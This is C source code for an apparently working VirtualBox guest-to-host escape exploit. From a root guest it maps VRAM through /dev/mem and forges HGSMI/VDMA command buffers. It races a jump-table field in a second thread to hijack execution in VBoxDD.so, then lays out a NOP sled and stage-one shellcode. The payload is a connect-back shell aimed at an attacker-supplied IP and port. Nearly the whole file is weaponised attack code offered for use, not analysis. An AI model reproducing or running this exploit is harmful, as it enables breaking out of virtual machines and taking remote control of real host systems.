/* blacklist vboxvideo driver for this exploit */

#define _GNU_SOURCE

#include <sys/io.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <err.h>
#include <string.h>
#include <pthread.h>
#include <sched.h>
#include "structures.h"
#include "shellcode.h"

#define VGA_PORT_HGSMI_HOST             0x3b0
#define VGA_PORT_HGSMI_GUEST            0x3d0

#define VBE_DISPI_IOPORT_INDEX          0x01CE
#define VBE_DISPI_IOPORT_DATA           0x01CF

#define VRAM_PADDR 			0xE0000000
#define PAGE_SIZE			4096

int mem;

uint8_t *map_phy_address(off_t address, size_t size)
{
	uint8_t *map;

	if (!mem) 
		mem = open("/dev/mem", O_RDWR | O_SYNC);

	map = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
			mem, address);
	return map;
}

int set_cpu_affinity(int cpu)
{
	int s;
	cpu_set_t cpuset;
	pthread_t thread;

	thread = pthread_self();
	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	s = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	return s;
}

void *jmp_table_race(void *gva)
{
	uint32_t volatile *vram_gva = (uint32_t *)gva;

	if (set_cpu_affinity(1) != 0) 
		errx(EXIT_FAILURE, "[!] Error setting CPU affinity");

	while(1) {
		/* points to 0xFEFEFEFF in VBoxDD.so */
		*vram_gva = 0x11EE9;		
		*vram_gva = VBOXVDMACMD_TYPE_CHILD_STATUS_IRQ;
	}

	return NULL;
}

int main(int argc, char **argv)
{
	uint8_t *vram, *payload;
	uint64_t  payload_offset;
	pthread_t race;
	struct shell_config config;
	struct payload *shellcode;

	/* VBox variables */
	uint64_t cbVRAM;
	HGSMIBUFFERHEADER *pHeader;
	PVBOXVDMACBUF_DR pCmd;
	PVBOXVDMACMD pDmaCmd;	
	PVBOXSHGSMIHEADER pSHdr;

	if (getuid() != 0 || geteuid() != 0) 
		errx(EXIT_FAILURE, "[!] Run program as root");

	if (argc < 3)
		errx(EXIT_FAILURE, "[!] Usage <address> <port>");

	iopl(3);

	cbVRAM = inl(VBE_DISPI_IOPORT_DATA);
	warnx("[+] VRAM buffer size = 0x%lx", cbVRAM);

	vram = map_phy_address(VRAM_PADDR, cbVRAM);
	if (vram == MAP_FAILED) 
		errx(EXIT_FAILURE, "[!] Error mapping VRAM buffer...");

	warnx("[+] VRAM buffer mapped @ %p", vram);

	/* set up payload at the end of VRAM buffer */
	warnx("[+] Setting up payload...");
	payload_offset = cbVRAM - PAGE_SIZE;
	payload = vram + payload_offset;
	memset(payload, 0, PAGE_SIZE);

	pHeader = (struct HGSMIBUFFERHEADER *)payload;

	/*
	 * 0xEEB (jmp near) acts as both tiny shellcode and size. The shellcode jumps to unused
	 * VBOXSHGSMIHEADER structure, which holds next stage shellcode.
	 * R8 points to HGSMIBUFFERHEADER during the crash.
	 */

	InitializeHeader(pHeader, 0xEEB, HGSMI_CH_VBVA, 
			VBVA_VDMA_CMD, payload_offset);

	pSHdr = (PVBOXSHGSMIHEADER)((uint8_t *)pHeader + sizeof (HGSMIBUFFERHEADER));
	/* To be used as shellcode if needed */
	memset(pSHdr, 0x42, sizeof(VBOXSHGSMIHEADER));

	pCmd = (PVBOXVDMACBUF_DR)((uint8_t *)pHeader + sizeof (HGSMIBUFFERHEADER) 
			+ sizeof(VBOXSHGSMIHEADER));

	/*
	 * 0xEEB (jmp near) acts as both tiny shellcode and fFlags. The shellcode jumps to 
	 * aGuestData of VBOXVDMACBUF_DR structure, which holds next stage shellcode.
	 * R15 and RSP+20 points to VBOXVDMACBUF_DR during the crash.
	 */

	/* VBOXVDMACBUF_FLAG_BUF_FOLLOWS_DR as 0xEB == 11101011 */
	pCmd->fFlags = 0xEEB;
	pCmd->cbBuf = sizeof(VBOXVDMACMD) + sizeof(VBOXVDMACBUF_DR) + 0xEEB;
	/* To be used as shellcode if needed */
	memset(&pCmd->aGuestData, 0x43, sizeof (pCmd->aGuestData));

	pDmaCmd = (PVBOXVDMACMD)((uint8_t *)pCmd + sizeof(VBOXVDMACBUF_DR));
	/* 
	 * This value is used by jump tables. Set it to a value such that vboxVDMACmdCheckCrCmd
	 * does not process the command and passes on to vboxVDMACmdExec
	 */
	pDmaCmd->enmType = VBOXVDMACMD_TYPE_CHILD_STATUS_IRQ; 

	/* Spawn another thread to modify pDmaCmd->enmType */
	pthread_create(&race, NULL, jmp_table_race, &pDmaCmd->enmType); 

	/* setup IP and port for connect back */
	warnx("[+] Preparing connect back shellcode for %s:%d", argv[1], atoi(argv[2]));
	inet_pton(AF_INET, argv[1], &config.sin_addr.s_addr);
	config.sin_port = htons(atoi(argv[2]));

	shellcode = (struct payload *)((uint8_t *)pDmaCmd + sizeof(VBOXVDMACMD));	
	shellcode->config.sin_addr.s_addr = config.sin_addr.s_addr;
	shellcode->config.sin_port = config.sin_port;
	shellcode->done = 0;

	create_shellcode(shellcode);

	if (set_cpu_affinity(0) != 0) 
		errx(EXIT_FAILURE, "[!] Error setting CPU affinity");

	/* Setup stage 1 shellcode & NOP sled */	
	memcpy((vram + cbVRAM) - (PAGE_SIZE * 2), &call_shell, 
			(uint8_t *)&call_shell_end - (uint8_t *)&call_shell);
	memset(vram, 0x90, cbVRAM - PAGE_SIZE * 2);

	while(1) {
		outl(payload_offset, VGA_PORT_HGSMI_GUEST);
		if (shellcode->done) exit(EXIT_SUCCESS);
	}

	return 0;
}
